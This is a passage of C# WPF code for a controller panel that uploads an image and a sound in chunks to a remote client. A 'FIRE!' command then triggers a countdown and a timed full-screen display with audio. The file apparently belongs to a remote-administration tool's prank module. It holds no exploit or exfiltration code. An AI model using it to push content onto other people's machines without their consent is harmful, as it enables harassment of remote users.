            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // Row 0: action buttons
            var tb = MakeBorder();
            var tw = new StackPanel { Orientation = Orientation.Horizontal };
            _fireBtn = Btn("FIRE!", DanCol, DanHov, null);
            _fireBtn.Click += (s, e) => DoFire();
            _fireBtn.FontSize = 14;
            _dismissBtn = Btn("Dismiss", WarnCol, WarnHov, null);
            _dismissBtn.Click += (s, e) => DoDismiss();
            var clearBtn = Btn("Clear Assets", SurfLCol, C("ButtonBgHoverColor"));
            clearBtn.Click += (s, e) => DoClearAssets();
            var clearLogBtn = Btn("Log", SurfLCol, C("ButtonBgHoverColor"));
            clearLogBtn.Click += (s, e) => { _logBox.Text = ""; _logLines = 0; };
            tw.Children.Add(_fireBtn);
            tw.Children.Add(_dismissBtn);
            tw.Children.Add(Sep());
            tw.Children.Add(clearBtn);
            tw.Children.Add(clearLogBtn);
            tb.Child = tw;
            Grid.SetRow(tb, 0);
            root.Children.Add(tb);

            // Row 1: file pickers
            var fpb = MakeBorder();
            fpb.Padding = new Thickness(8, 6, 8, 6);
            var fpg = new Grid();
            fpg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            fpg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            fpg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            fpg.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            fpg.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            fpg.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            fpg.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

            var imgBtn = Btn("Select Image", AccCol, AccHov, null);
            imgBtn.Click += (s, e) => PickImage();
            Grid.SetRow(imgBtn, 0); Grid.SetColumn(imgBtn, 0);
            fpg.Children.Add(imgBtn);

            _imgLabel = new TextBlock { Text = "(none)", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 4, 0), TextTrimming = TextTrimming.CharacterEllipsis };
            Grid.SetRow(_imgLabel, 0); Grid.SetColumn(_imgLabel, 1);
            fpg.Children.Add(_imgLabel);

            _imgSizeLabel = new TextBlock { Text = "", Foreground = DmB, FontSize = 11, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 0, 4, 0) };
            Grid.SetRow(_imgSizeLabel, 0); Grid.SetColumn(_imgSizeLabel, 2);
            fpg.Children.Add(_imgSizeLabel);

            _imgUpBtn = Btn("Upload", OkCol, OkHov, null);
            _imgUpBtn.Click += (s, e) => UploadImage();
            Grid.SetRow(_imgUpBtn, 0); Grid.SetColumn(_imgUpBtn, 3);
            fpg.Children.Add(_imgUpBtn);

            var sndBtn = Btn("Select Sound", AccCol, AccHov, null);
            sndBtn.Click += (s, e) => PickSound();
            sndBtn.Margin = new Thickness(2, 4, 2, 2);
            Grid.SetRow(sndBtn, 1); Grid.SetColumn(sndBtn, 0);
            fpg.Children.Add(sndBtn);

            _sndLabel = new TextBlock { Text = "(none — will use beep)", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 4, 0), TextTrimming = TextTrimming.CharacterEllipsis };
            Grid.SetRow(_sndLabel, 1); Grid.SetColumn(_sndLabel, 1);
            fpg.Children.Add(_sndLabel);

            _sndSizeLabel = new TextBlock { Text = "", Foreground = DmB, FontSize = 11, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 0, 4, 0) };
            Grid.SetRow(_sndSizeLabel, 1); Grid.SetColumn(_sndSizeLabel, 2);
            fpg.Children.Add(_sndSizeLabel);

            _sndUpBtn = Btn("Upload", OkCol, OkHov, null);
            _sndUpBtn.Margin = new Thickness(2, 4, 2, 2);
            _sndUpBtn.Click += (s, e) => UploadSound();
            Grid.SetRow(_sndUpBtn, 1); Grid.SetColumn(_sndUpBtn, 3);
            fpg.Children.Add(_sndUpBtn);

            var progPanel = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 4, 0, 0) };
            _uploadProgress = new ProgressBar { Width = 200, Height = 14, Minimum = 0, Maximum = 100, Value = 0, Margin = new Thickness(0, 0, 8, 0), Visibility = Visibility.Collapsed };
            _uploadProgressLabel = new TextBlock { Text = "", Foreground = DmB, FontSize = 11, VerticalAlignment = VerticalAlignment.Center, Visibility = Visibility.Collapsed };
            progPanel.Children.Add(_uploadProgress);
            progPanel.Children.Add(_uploadProgressLabel);
            Grid.SetRow(progPanel, 2); Grid.SetColumnSpan(progPanel, 4);
            fpg.Children.Add(progPanel);

            fpb.Child = fpg;
            Grid.SetRow(fpb, 1);
            root.Children.Add(fpb);

            // Row 2: settings (display duration + countdown from)
            var stb = MakeBorder();
            var stg = new Grid();
            stg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            stg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            stg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // Countdown from row
            var cdPanel = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 2, 0, 2) };
            cdPanel.Children.Add(Lbl("Countdown from:"));
            _cdSlider = new Slider { Width = 150, Minimum = 1, Maximum = 30, Value = 3, TickFrequency = 1, IsSnapToTickEnabled = true, Margin = new Thickness(4, 2, 4, 2), VerticalAlignment = VerticalAlignment.Center };
            _cdLabel = Lbl("3");
            _cdSlider.ValueChanged += (s, e) => _cdLabel.Text = ((int)_cdSlider.Value).ToString();
            cdPanel.Children.Add(_cdSlider);
            cdPanel.Children.Add(_cdLabel);
            Grid.SetRow(cdPanel, 0);
            stg.Children.Add(cdPanel);

            // Display duration row
            var durPanel = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 2, 0, 2) };
            durPanel.Children.Add(Lbl("Display duration:"));
            _durSlider = new Slider { Width = 150, Minimum = 1, Maximum = 30, Value = 10, TickFrequency = 1, IsSnapToTickEnabled = true, Margin = new Thickness(4, 2, 4, 2), VerticalAlignment = VerticalAlignment.Center };
            _durLabel = Lbl("10s");
            _durSlider.ValueChanged += (s, e) => _durLabel.Text = ((int)_durSlider.Value) + "s";
            durPanel.Children.Add(_durSlider);
            durPanel.Children.Add(_durLabel);
            Grid.SetRow(durPanel, 1);
            stg.Children.Add(durPanel);

            // Flow description
            var flowPanel = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 2, 0, 2) };
            flowPanel.Children.Add(Lbl("Flow:  N ? N-1 ? ... ? 1 ? IMAGE + SOUND (auto-close)"));
            Grid.SetRow(flowPanel, 2);
            stg.Children.Add(flowPanel);

            stb.Child = stg;
            Grid.SetRow(stb, 2);
            root.Children.Add(stb);

            // Row 3: image preview
            _imgPreview = new Border { Background = new SolidColorBrush(BgCol), BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Height = 140 };
            _imgPreview.Child = new TextBlock { Text = "No image selected", Foreground = DmB, FontSize = 12, HorizontalAlignment = HorizontalAlignment.Center, VerticalAlignment = VerticalAlignment.Center };
            Grid.SetRow(_imgPreview, 3);
            root.Children.Add(_imgPreview);

            // Row 4: status indicators
            var indBrd = MakeBorder();
            var indPanel = new StackPanel { Orientation = Orientation.Horizontal };
            indPanel.Children.Add(Lbl("Status:"));
            _imgDot = new Border { Width = 10, Height = 10, CornerRadius = new CornerRadius(5), Background = new SolidColorBrush(ButtonBgClr), Margin = new Thickness(8, 0, 4, 0), VerticalAlignment = VerticalAlignment.Center };
            indPanel.Children.Add(_imgDot);
            indPanel.Children.Add(Lbl("Image"));
            _sndDot = new Border { Width = 10, Height = 10, CornerRadius = new CornerRadius(5), Background = new SolidColorBrush(ButtonBgClr), Margin = new Thickness(16, 0, 4, 0), VerticalAlignment = VerticalAlignment.Center };
            indPanel.Children.Add(_sndDot);
            indPanel.Children.Add(Lbl("Sound"));
            indBrd.Child = indPanel;
            Grid.SetRow(indBrd, 4);
            root.Children.Add(indBrd);

            // Row 5: log
            _logBrd = new Border { Background = new SolidColorBrush(BgCol), BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0) };
            _logBox = new TextBox
            {
                Background = new SolidColorBrush(BgCol),
                Foreground = new SolidColorBrush(OkCol),
                BorderThickness = new Thickness(0),
                FontFamily = new FontFamily("Consolas"),
                FontSize = 11,
                IsReadOnly = true,
                TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Padding = new Thickness(4),
                CaretBrush = Brushes.Transparent,
                AcceptsReturn = true,
                Style = null
            };
            _logBrd.Child = _logBox;
            Grid.SetRow(_logBrd, 5);
            root.Children.Add(_logBrd);

            // Row 6: status bar
            var statusBrd = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0), Padding = new Thickness(10, 5, 10, 5) };
            _status = new TextBlock { Text = "Ready — Select image & sound, then FIRE!", Foreground = DmB, FontSize = 12 };
            statusBrd.Child = _status;
            Grid.SetRow(statusBrd, 6);
            root.Children.Add(statusBrd);

            Content = root;
            Background = BgB;
        }

        void UpdateDots()
        {
            if (_disposed) return;
            _imgDot.Background = _imageUploaded ? new SolidColorBrush(OkCol) : (_imageBytes != null ? new SolidColorBrush(WarnCol) : new SolidColorBrush(ButtonBgClr));
            _sndDot.Background = _soundUploaded ? new SolidColorBrush(OkCol) : (_soundBytes != null ? new SolidColorBrush(WarnCol) : new SolidColorBrush(ButtonBgClr));
        }

        Border MakeBorder()
        {
            return new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(4, 3, 4, 3) };
        }

        void PickImage()
        {
            var dlg = new Microsoft.Win32.OpenFileDialog { Title = "Select Image", Filter = "Images|*.png;*.jpg;*.jpeg;*.bmp;*.gif;*.tiff;*.tif|All|*.*" };
            if (dlg.ShowDialog() != true) return;
            try
            {
                _imageBytes = File.ReadAllBytes(dlg.FileName);
                _imageName = Path.GetFileName(dlg.FileName);
                _imgLabel.Text = _imageName;
                _imgSizeLabel.Text = FormatSize(_imageBytes.Length);
                _imageUploaded = false;
                UpdateDots();
                Log("Image selected: " + _imageName + " (" + FormatSize(_imageBytes.Length) + ")");
                try
                {
                    var img = new System.Windows.Media.Imaging.BitmapImage();
                    img.BeginInit();
                    img.StreamSource = new MemoryStream(_imageBytes);
                    img.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
                    img.DecodePixelHeight = 140;
                    img.EndInit();
                    img.Freeze();
                    _imgPreview.Child = new System.Windows.Controls.Image { Source = img, Stretch = Stretch.Uniform, HorizontalAlignment = HorizontalAlignment.Center, VerticalAlignment = VerticalAlignment.Center };
                }
                catch { _imgPreview.Child = new TextBlock { Text = "Preview unavailable", Foreground = DmB, HorizontalAlignment = HorizontalAlignment.Center, VerticalAlignment = VerticalAlignment.Center }; }
                St("Image loaded: " + _imageName);
            }
            catch (Exception ex) { Log("Load failed: " + ex.Message); }
        }

        void PickSound()
        {
            var dlg = new Microsoft.Win32.OpenFileDialog { Title = "Select Sound (WAV or MP3)", Filter = "Audio|*.wav;*.mp3|WAV|*.wav|MP3|*.mp3|All|*.*" };
            if (dlg.ShowDialog() != true) return;
            try
            {
                _soundBytes = File.ReadAllBytes(dlg.FileName);
                _soundName = Path.GetFileName(dlg.FileName);
                string ext = Path.GetExtension(dlg.FileName).ToLowerInvariant();
                _soundIsMp3 = (ext == ".mp3");
                _sndLabel.Text = _soundName + (_soundIsMp3 ? " (MP3)" : " (WAV)");
                _sndSizeLabel.Text = FormatSize(_soundBytes.Length);
                _soundUploaded = false;
                UpdateDots();
                Log("Sound selected: " + _soundName + " (" + FormatSize(_soundBytes.Length) + ", " + (_soundIsMp3 ? "MP3" : "WAV") + ")");
                St("Sound loaded: " + _soundName);
            }
            catch (Exception ex) { Log("Load failed: " + ex.Message); }
        }

        async void UploadImage()
        {
            if (_imageBytes == null || _imageBytes.Length == 0) { Log("No image selected."); return; }
            if (_uploading) { Log("Upload in progress."); return; }
            _uploading = true;
            SetUploadUI(true);
            Log("Uploading image...");
            St("Uploading image...");
            string err = null;
            try { await SendChunkedImage(_imageBytes); _imageUploaded = true; UpdateDots(); Log("Image uploaded."); St("Image uploaded: " + _imageName); }
            catch (Exception ex) { err = ex.Message; }
            if (err != null) { Log("Upload failed: " + err); St("Upload failed"); }
            _uploading = false;
            SetUploadUI(false);
        }

        async void UploadSound()
        {
            if (_soundBytes == null || _soundBytes.Length == 0) { Log("No sound selected."); return; }
            if (_uploading) { Log("Upload in progress."); return; }
            _uploading = true;
            SetUploadUI(true);
            Log("Uploading sound...");
            St("Uploading sound...");
            string err = null;
            try { await SendChunkedSound(_soundBytes, _soundIsMp3); _soundUploaded = true; UpdateDots(); Log("Sound uploaded."); St("Sound uploaded: " + _soundName); }
            catch (Exception ex) { err = ex.Message; }
            if (err != null) { Log("Upload failed: " + err); St("Upload failed"); }
            _uploading = false;
            SetUploadUI(false);
        }

        void SetUploadUI(bool active)
        {
            if (_disposed) return;
            _uploadProgress.Visibility = active ? Visibility.Visible : Visibility.Collapsed;
            _uploadProgressLabel.Visibility = active ? Visibility.Visible : Visibility.Collapsed;
            _fireBtn.IsEnabled = !active;
            _imgUpBtn.IsEnabled = !active;
            _sndUpBtn.IsEnabled = !active;
            if (!active) { _uploadProgress.Value = 0; _uploadProgressLabel.Text = ""; }
        }

        async Task SendChunkedImage(byte[] data)
        {
            await SendChunkedGeneric(0x10, 0x20, data, "image", null);
        }

        async Task SendChunkedSound(byte[] data, bool isMp3)
        {
            await SendChunkedGeneric(0x11, 0x21, data, "sound", isMp3);
        }

        async Task SendChunkedGeneric(byte singleCmd, byte chunkStartCmd, byte[] data, string label, bool? isMp3)
        {
            int totalSent = 0;
            int remaining = data.Length;
            bool isSinglePacket = (data.Length <= CHUNK_SIZE);

            if (isSinglePacket)
            {
                byte[] packet;
                if (singleCmd == 0x11)
                {
                    // Sound: cmd + mp3flag + data
                    packet = new byte[2 + data.Length];
                    packet[0] = singleCmd;
                    packet[1] = (byte)(isMp3 == true ? 1 : 0);
                    Buffer.BlockCopy(data, 0, packet, 2, data.Length);
                }
                else
                {
                    packet = new byte[1 + data.Length];
                    packet[0] = singleCmd;
                    Buffer.BlockCopy(data, 0, packet, 1, data.Length);
                }
                await _context.SendToClient(packet);
                UpdateProgress(label, data.Length, data.Length);
            }
            else
            {
                while (remaining > 0)
                {
                    int chunkLen = Math.Min(remaining, CHUNK_SIZE);
                    bool isFirst = (totalSent == 0);
                    byte[] packet;

                    if (isFirst)
                    {
                        if (chunkStartCmd == 0x21)
                        {
                            // Sound chunk start: cmd + 4 bytes len + mp3flag + data
                            packet = new byte[6 + chunkLen];
                            packet[0] = (byte)chunkStartCmd;
                            packet[1] = (byte)(data.Length & 0xFF);
                            packet[2] = (byte)((data.Length >> 8) & 0xFF);
                            packet[3] = (byte)((data.Length >> 16) & 0xFF);
                            packet[4] = (byte)((data.Length >> 24) & 0xFF);
                            packet[5] = (byte)(isMp3 == true ? 1 : 0);
                            Buffer.BlockCopy(data, totalSent, packet, 6, chunkLen);
                        }
                        else
                        {
                            packet = new byte[5 + chunkLen];
                            packet[0] = (byte)chunkStartCmd;
                            packet[1] = (byte)(data.Length & 0xFF);
                            packet[2] = (byte)((data.Length >> 8) & 0xFF);
                            packet[3] = (byte)((data.Length >> 16) & 0xFF);
                            packet[4] = (byte)((data.Length >> 24) & 0xFF);
                            Buffer.BlockCopy(data, totalSent, packet, 5, chunkLen);
                        }
                    }
                    else
                    {
                        packet = new byte[1 + chunkLen];
                        packet[0] = 0x22;
                        Buffer.BlockCopy(data, totalSent, packet, 1, chunkLen);
                    }

                    await _context.SendToClient(packet);
                    totalSent += chunkLen;
                    remaining -= chunkLen;
                    UpdateProgress(label, totalSent, data.Length);
                    if (remaining > 0) await Task.Delay(5);
                }
            }
        }

        void UpdateProgress(string label, int sent, int total)
        {
            double pct = (double)sent / total * 100.0;
            int capturedSent = sent;
            int capturedTotal = total;
            string capturedLabel = label;
            double capturedPct = pct;
            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                _uploadProgress.Value = capturedPct;
                _uploadProgressLabel.Text = capturedLabel + ": " + FormatSize(capturedSent) + " / " + FormatSize(capturedTotal) + " (" + capturedPct.ToString("F0") + "%)";
            });
        }

        async void DoFire()
        {
            if (_imageBytes == null || _imageBytes.Length == 0) { Log("No image selected!"); St("No image!"); return; }
            if (_uploading) { Log("Upload in progress."); return; }

            if (!_imageUploaded)
            {
                Log("Auto-uploading image...");
                St("Uploading image...");
                _uploading = true;
                SetUploadUI(true);
                string err = null;
                try { await SendChunkedImage(_imageBytes); _imageUploaded = true; UpdateDots(); Log("Image uploaded."); }
                catch (Exception ex) { err = ex.Message; }
                _uploading = false;
                SetUploadUI(false);
                if (err != null) { Log("Upload failed: " + err); return; }
            }

            if (_soundBytes != null && _soundBytes.Length > 0 && !_soundUploaded)
            {
                Log("Auto-uploading sound...");
                St("Uploading sound...");
                _uploading = true;
                SetUploadUI(true);
                string err = null;
                try { await SendChunkedSound(_soundBytes, _soundIsMp3); _soundUploaded = true; UpdateDots(); Log("Sound uploaded."); }
                catch (Exception ex) { err = ex.Message; }
                _uploading = false;
                SetUploadUI(false);
                if (err != null) { Log("Sound upload failed: " + err); return; }
            }

            int dur = (int)_durSlider.Value;
            int cdFrom = (int)_cdSlider.Value;
            byte[] fireCmd = new byte[3];
            fireCmd[0] = 0x12;
            fireCmd[1] = (byte)dur;
            fireCmd[2] = (byte)cdFrom;
            string fireErr = null;
            try { await _context.SendToClient(fireCmd); Log("?? FIRED! countdown=" + cdFrom + " display=" + dur + "s"); St("?? " + cdFrom + "... ? 1 ? ?? (auto-close " + dur + "s)"); }
            catch (Exception ex) { fireErr = ex.Message; }
            if (fireErr != null) { Log("Fire failed: " + fireErr); St("Fire failed"); }
        }

        async void DoDismiss()
        {
            string err = null;
            try { await _context.SendToClient(new byte[] { 0x13 }); Log("Dismiss sent."); St("Dismissed."); }
            catch (Exception ex) { err = ex.Message; }
            if (err != null) Log("Dismiss failed: " + err);
        }

        async void DoClearAssets()
        {
            string err = null;
            try { await _context.SendToClient(new byte[] { 0x14 }); _imageUploaded = false; _soundUploaded = false; UpdateDots(); Log("Assets cleared."); St("Assets cleared."); }
            catch (Exception ex) { err = ex.Message; }
            if (err != null) Log("Clear failed: " + err);
        }

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;
            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                try
                {
                    switch (data[0])
                    {
                        case 0xFD:
                            if (data.Length > 1) Log("[C] " + Encoding.UTF8.GetString(data, 1, data.Length - 1));
                            break;
                        case 0xFE:
                            if (data.Length > 2) Log("[OK] " + Encoding.UTF8.GetString(data, 2, data.Length - 2));
                            break;
                        case 0xFF:
                            if (data.Length > 2) { string m = Encoding.UTF8.GetString(data, 2, data.Length - 2); Log("[ERR] " + m); St("Error: " + m); }
                            break;
                    }
                }
                catch { }
            });
        }

        void Log(string m)
        {
            if (_disposed) return;
            var l = "[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + m + "\n";
            if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => LogI(l));
            else LogI(l);
        }

        void LogI(string l)
        {
            if (_disposed) return;
            _logBox.AppendText(l);
            _logLines++;
            if (_logLines > 500)
            {
                var t = _logBox.Text;
                int c = 0;
                for (int i = 0; i < 100 && c < t.Length; i++) { int n = t.IndexOf('\n', c); if (n < 0) break; c = n + 1; }
                if (c > 0) { _logBox.Text = t.Substring(c); _logLines -= 100; }
            }
            _logBox.ScrollToEnd();
        }

        void St(string t)
        {
            if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => { if (!_disposed) _status.Text = t; });
            else if (!_disposed) _status.Text = t;
        }

        static string FormatSize(long bytes)
        {
            if (bytes < 1024) return bytes + " B";
            if (bytes < 1024 * 1024) return (bytes / 1024.0).ToString("F1") + " KB";
            return (bytes / 1024.0 / 1024.0).ToString("F1") + " MB";
        }

        Button Btn(string t, Color bg, Color hv, SolidColorBrush fg = null)
        {
            var nb = new SolidColorBrush(bg); var hb = new SolidColorBrush(hv);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = t, Template = tp, Foreground = fg ?? TxB, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        TextBlock Lbl(string t) => new() { Text = t, Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 2, 4, 2) };
        Border Sep() => new() { Width = 1, Background = new SolidColorBrush(C("ButtonBorderColor")), Margin = new Thickness(4, 2, 4, 2) };

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            try { _context.SendToClient(new byte[] { 0x13 }).Wait(500); } catch { }
        }
    }
}